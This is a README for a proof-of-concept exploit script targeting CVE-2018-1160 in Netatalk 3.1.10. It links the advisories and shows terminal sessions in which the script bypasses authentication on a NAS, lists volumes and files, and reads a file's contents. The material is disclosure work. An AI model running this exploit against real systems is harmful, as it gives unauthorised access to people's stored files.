# pea.py
Pea is a proof of concept exploit that leverages CVE-2018-1160 to control execution flow of Netatalk and bypass authentication. This script was written and tested against Netatalk 3.1.10 on a Seagate NAS.

CVE-2018-1160 was patched in Netatalk 3.1.12.

## Advisory Links
http://netatalk.sourceforge.net/3.1/ReleaseNotes3.1.12.html
https://github.com/Netatalk/Netatalk/commit/750f9b55844b444b8ff1a38206fd2bdbab85c21f
https://www.tenable.com/security/research/tra-2018-48

## Usage example

```sh
albinolobster@ubuntu:~$ python pea.py -i 192.168.88.252 -lv
[+] Attempting connection to 192.168.88.252:548
[+] Connected!
[+] Sending exploit to overwrite preauth_switch data.
[+] Listing volumes
[+] 2 volumes are available:
	-> jbaines
	-> Public
albinolobster@ubuntu:~$ python pea.py -i 192.168.88.252 -lvc -v jbaines
[+] Attempting connection to 192.168.88.252:548
[+] Connected!
[+] Sending exploit to overwrite preauth_switch data.
[+] Listing files in volume jbaines
[+] Volume ID is 2
[+] Files (3):
	[75] super_secret.txt
	[20] important_dir/
	[18] .DS_Store
albinolobster@ubuntu:~$ python pea.py -i 192.168.88.252 --cat -v jbaines -f super_secret.txt
[+] Attempting connection to 192.168.88.252:548
[+] Connected!
[+] Sending exploit to overwrite preauth_switch data.
[+] Cat file super_secret.txt in volume jbaines
[+] Volume ID is 2
[+] Fork ID: 256
[+] File contents:
I'm a little pea
I love the sky and the trees
I'm a teeny tiny little ant
Checking out this and that

And I am nothing
Ah, so you have nothing to hide

albinolobster@ubuntu:~$
```
